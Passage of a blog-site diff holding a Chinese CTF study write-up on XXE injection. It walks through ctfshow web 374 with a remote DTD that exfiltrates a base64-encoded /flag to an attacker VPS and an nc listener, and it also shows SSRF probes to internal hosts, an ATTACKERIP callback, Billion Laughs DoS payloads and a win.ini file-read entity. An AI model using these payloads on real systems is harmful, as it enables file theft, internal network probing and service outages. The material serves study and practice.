+<p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p>
+<p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p>
+<p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p>
+<h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们的做法是将flag外带</p>
+<p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p>
+<p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p>
+<p><img src="https://s2.loli.net/2024/03/13/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p>
+<p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>
+
+<p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p>
+<p><img src="https://s2.loli.net/2024/03/13/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p>
+<p>此时</p>
+<p><img src="https://s2.loli.net/2024/03/13/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p>
+<p>说明8000端口启动http服务成功</p>
+<p>同理我们来测试1234端口：</p>
+<p><img src="https://s2.loli.net/2024/03/13/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p>
+<p>说明1234端口也启动http服务成功</p>
+<p>创建XXE.dtd文件并写入如下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure>
+
+<p>在另一个页面监听本地1234端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/13/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p>
+<p>burp发包内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:1234/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/13/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p>
+<p>在监听的页面就可以看到加密后的flag</p>
+<p><img src="https://s2.loli.net/2024/03/13/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p>
+<p>解密后得到flag</p>
+<p><img src="https://s2.loli.net/2024/03/13/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p>
+<p>对payload的解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:1234/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>定义了两个实体：</p>
+<ol>
+<li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p>
+</li>
+<li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:1234/XXE.dtd</code>加载DTD文件。</p>
+</li>
+</ol>
+<p>以下是jay17师傅的解释（实体名有所改动）：</p>
+<ol>
+<li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:1234/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li>
+<li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:1234/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li>
+<li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li>
+<li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li>
+<li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li>
+</ol>
+<h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p>
+<p>首先检测XML是否会被成功解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/20/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p>
+<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
+<p><img src="https://s2.loli.net/2023/12/20/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p>
+<p>接下来检测该端点是否支持DTD引用外部实体：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+<p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p>
+<p><img src="https://s2.loli.net/2023/12/20/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p>
+<p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p>
+<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
+<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p>
+<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
+<p>之后便可使用以下语句尝试是否能够建立连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
+<h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+<p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p>
+<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
+<p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>XXE</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>包含session文件学习记录</title>
     <url>/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="PHP-session包含"><a href="#PHP-session包含" class="headerlink" title="PHP session包含"></a>PHP session包含</h1><h2 id="什么是PHP-session"><a href="#什么是PHP-session" class="headerlink" title="什么是PHP session"></a>什么是PHP session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
@@ -460,258 +854,6 @@
       </tags>
   </entry>
   <entry>
-    <title>XXE学习记录</title>
-    <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>前言：</p>
-<p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对movectf那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把XXE系统学个一遍。。。</p>
-<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE全称是：XML External Entity，也就是XML外部实体注入攻击，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
-<span id="more"></span>
-
-<h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p>
-<h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
-<p>下面是 John 写给 George 的便签，存储为 XML ：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p>
-<h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
-<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
-<h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p>
-<ol>
-<li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li>
-<li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li>
-</ol>
-<p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p>
-<p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p>
-<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p>
-<h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>带有 DTD 的 XML 文档实例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p>
-<p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p>
-<p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
-<p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
-<p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
-<p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
-<h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure>
-
-<p>这是包含 DTD 的 “note.dtd” 文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul>
-<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
-<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
-<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
-<li>您还可以使用 DTD 来验证您自身的数据。</li>
-</ul>
-<h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
-<h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p>
-<p>实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p>
-<h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
-<p>实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中：</p>
-<p>第一个参数实体定义如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p>
-<p>第二个参数实体定义如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p>
-<p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p>
-<p>实体根据引用方式，还可分为内部实体与外部实体</p>
